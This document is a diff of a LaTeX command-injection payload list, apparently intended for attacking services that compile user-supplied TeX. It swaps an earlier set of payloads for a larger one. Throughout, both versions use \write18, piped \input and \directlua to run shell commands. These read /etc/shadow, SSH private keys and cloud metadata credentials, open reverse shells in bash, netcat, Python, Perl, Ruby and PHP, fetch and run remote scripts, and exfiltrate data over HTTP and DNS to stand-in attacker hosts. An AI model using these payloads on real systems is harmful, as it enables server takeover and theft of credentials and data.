@@ -1,32 +1,51 @@
-\immediate\write18{id}
-\immediate\write18{id > /tmp/pwned.txt}
-\immediate\write18{cat /etc/passwd > /tmp/out.txt}
-\input{|"id"}
-\input{|"cat /etc/passwd"}
 \write18{id}
-\write18{curl https://evil.com/$(id)}
-
-\openin\file=|"id"
-\read\file to\x
-\x
-
-\newcommand{\exec}[1]{\immediate\write18{#1}}
-\exec{id}
-\exec{bash -i >& /dev/tcp/ATTACKER/4444 0>&1}
-\exec{wget https://evil.com/shell.sh -O /tmp/s && bash /tmp/s}
-
-\immediate\write18{curl https://evil.com/?x=$(cat /etc/passwd | base64)}
-\immediate\write18{curl https://evil.com/?hostname=$(hostname)}
-
-\immediate\write18{bash -i >& /dev/tcp/ATTACKER/4444 0>&1}
-\immediate\write18{python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash"])'}
-
-\begin{minted}{bash}
-id
-\end{minted}
-
-\directlua{os.execute("id")}
-\directlua{os.execute("curl https://evil.com/$(id)")}
-
-\immediate\write18{id > /tmp/test123}
-\input{/tmp/test123}
+\write18{whoami}
+\write18{cat /etc/passwd}
+\write18{cat /etc/shadow}
+\write18{uname -a}
+\write18{hostname}
+\write18{ls -la /}
+\write18{ls -la /var/www}
+\write18{env}
+\write18{printenv}
+\write18{ps aux}
+\write18{netstat -an}
+\write18{ifconfig}
+\write18{ip addr}
+\write18{cat /proc/version}
+\write18{cat /proc/self/environ}
+\write18{cat /root/.ssh/id_rsa}
+\write18{cat ~/.bash_history}
+\write18{find / -name "*.conf" 2>/dev/null | head -20}
+\write18{find / -perm -u=s -type f 2>/dev/null}
+\write18{cat /etc/crontab}
+\write18{crontab -l}
+\write18{last}
+\write18{who}
+\write18{w}
+\write18{curl http://169.254.169.254/latest/meta-data/iam/security-credentials/}
+\write18{curl http://169.254.169.254/latest/meta-data/}
+\write18{wget -q -O- http://169.254.169.254/latest/meta-data/}
+\write18{bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'}
+\write18{nc -e /bin/bash ATTACKER_IP 4444}
+\write18{python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'}
+\write18{perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'}
+\write18{ruby -rsocket -e 'f=TCPSocket.open("ATTACKER_IP",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'}
+\write18{php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'}
+\write18{curl -s http://ATTACKER_IP/shell.sh | bash}
+\write18{wget -q -O- http://ATTACKER_IP/shell.sh | bash}
+\write18{curl http://ATTACKER_IP/$(cat /etc/passwd | base64 -w 0)}
+\write18{wget http://ATTACKER_IP/?data=$(id | base64 -w 0)}
+\write18{curl -X POST http://ATTACKER_IP/ -d "$(cat /etc/passwd)"}
+\write18{nslookup $(id).ATTACKER_URL}
+\write18{dig $(id).ATTACKER_URL}
+\write18{ping -c 1 $(id).ATTACKER_URL}
+\write18{mkfifo /tmp/f;nc ATTACKER_IP 4444 </tmp/f|/bin/sh >/tmp/f 2>&1;rm /tmp/f}
+\immediate\write18{id}
+\immediate\write18{cat /etc/passwd}
+\immediate\write18{bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1}
+\immediate\write18{curl http://ATTACKER_IP/$(id|base64)}
+\input|id>/tmp/x
+\input|cat /etc/passwd>/tmp/x
+\input|curl http://ATTACKER_IP/$(id|base64)
+\input|bash -c 'nc -e /bin/bash ATTACKER_IP 4444'
